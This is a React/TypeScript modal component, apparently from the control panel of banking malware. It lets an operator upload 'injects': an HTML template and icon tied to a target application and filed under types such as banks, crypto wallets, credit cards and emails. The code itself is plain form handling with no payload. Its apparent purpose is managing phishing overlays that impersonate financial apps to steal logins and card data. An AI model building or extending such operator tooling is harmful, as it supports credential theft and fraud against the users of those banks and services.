import React from "react";
import {Button, Form, Input, Modal, Select, Upload} from "antd";
import {ModalsProps} from "../../../Model/Modal";
import {inputRules} from "../../../Util/config";
import {UploadFile} from "antd/es/upload/interface";
import {addInject} from "../../../Store/Injections/Actions";
import {useDispatch} from "react-redux";
import {UploadRequestOption} from "rc-upload/lib/interface";
import {FieldData} from "rc-field-form/es/interface";


const {Option} = Select;

const AddInject: React.FC<ModalsProps> = (props: ModalsProps) => {
    const [form] = Form.useForm();

    const dispatch = useDispatch();

    const formSubmitHandler = () => {
        const formFields = {
            name: form.getFieldValue("inject_name"),
            application: form.getFieldValue("app_name"),
            type: form.getFieldValue("type"),
            image: form.getFieldValue("icon").map((icon: UploadFile) => icon.originFileObj)[0],
            html: form.getFieldValue("html").map((html: UploadFile) => html.originFileObj)[0],
        };

        dispatch(addInject(formFields));

        props.setVisible(false);
        form.resetFields();
    };

    const uploadFile = (e: any) => e && e.fileList;

    const validateFiles = (options: UploadRequestOption, mimeType: string, fieldName: string) => {
        setTimeout(() => {
            if (options.onSuccess) {
                options.onSuccess(true);

                const file = options.file as File;
                if (file.type !== mimeType) {
                    const fields: FieldData[] = [
                        {
                            name: fieldName,
                            value: null,
                            errors: [
                                "invalid extension",
                            ],
                            validating: false,
                        },
                    ];

                    form.setFields(fields);
                }
            }
        }, 0);
    };

    return (
        <>
            <Modal
                title="Add new inject"
                visible={props.visible}
                onCancel={() => {
                    props.setVisible(false);
                    form.resetFields();
                }}
                onOk={() => form.submit()}
                okText="Save inject"
                width={400}
                destroyOnClose
            >
                <Form
                    form={form}
                    onFinish={formSubmitHandler}
                    layout="vertical"
                >
                    <Form.Item label="Inject name" name="inject_name" rules={inputRules}>
                        <Input placeholder="Inject name"/>
                    </Form.Item>
                    <Form.Item label="Application name" name="app_name" rules={inputRules}>
                        <Input placeholder="Application name"/>
                    </Form.Item>
                    <Form.Item label="Type" name="type" rules={inputRules}>
                        <Select placeholder="Type">
                            <Option value="banks">Banks</Option>
                            <Option value="crypt">Crypt</Option>
                            <Option value="wallets">Wallets</Option>
                            <Option value="shops">Shops</Option>
                            <Option value="credit_cards">Credit cards</Option>
                            <Option value="emails">Emails</Option>
                        </Select>
                    </Form.Item>
                    <Form.Item
                        name="icon"
                        label="Icon"
                        valuePropName="fileList"
                        getValueFromEvent={uploadFile}
                        rules={inputRules}
                    >
                        <Upload
                            name="app_icon"
                            listType="picture"
                            accept={"image/png"}
                            multiple={false}
                            customRequest={(options) => validateFiles(options, "image/png", "icon")}
                            maxCount={1}
                        >
                            <Button>Click to upload</Button>
                        </Upload>
                    </Form.Item>
                    <Form.Item
                        name="html"
                        label="HTML Template"
                        valuePropName="fileList"
                        getValueFromEvent={uploadFile}
                        rules={inputRules}
                    >
                        <Upload
                            name="app_html"
                            accept={"text/html"}
                            multiple={false}
                            customRequest={(options) => validateFiles(options, "text/html", "html")}
                            maxCount={1}
                        >
                            <Button>Click to upload</Button>
                        </Upload>
                    </Form.Item>
                </Form>
            </Modal>
        </>
    );
};

export default AddInject;
